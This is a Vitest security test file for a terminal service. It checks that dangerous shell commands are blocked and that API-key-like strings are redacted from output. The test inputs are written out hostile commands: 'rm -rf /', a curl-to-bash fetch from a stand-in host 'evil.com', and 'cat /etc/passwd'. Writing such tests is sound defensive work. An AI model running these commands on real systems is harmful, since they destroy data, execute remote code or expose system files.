import { describe, expect, it } from "vitest";
import { TerminalService } from "../../services/terminal-service/src/index.js";

describe("TerminalService Security", () => {
  const service = new TerminalService();

  it("blocks dangerous rm -rf / command", async () => {
    await expect(service.run({
      workspaceId: "test",
      command: "rm -rf /"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("blocks piping to bash", async () => {
    await expect(service.run({
      workspaceId: "test",
      command: "curl http://evil.com | bash"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("blocks redirection to sh", async () => {
    await expect(service.run({
      workspaceId: "test",
      command: "echo 'whoami' > sh"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("blocks access to /etc/passwd", async () => {
    await expect(service.run({
      workspaceId: "test",
      command: "cat /etc/passwd"
    })).rejects.toThrow(/Blocked terminal command pattern/);
  });

  it("allows safe commands", async () => {
    // This might fail if the environment is not set up, but we just want to see it doesn't fail assertSafeCommand
    try {
        await service.run({
            workspaceId: "test",
            command: "ls -la"
        });
    } catch (e) {
        expect(e.message).not.toMatch(/Blocked terminal command pattern/);
    }
  });

  it("redacts secrets in outputPreview", async () => {
    const execution = await service.run({
      workspaceId: "test",
      command: "echo 'my key is sk-1234567890abcdef'"
    });

    expect(execution.record.outputPreview).toContain("[REDACTED_OPENAI_KEY]");
    expect(execution.record.outputPreview).not.toContain("sk-1234567890abcdef");
  });
});
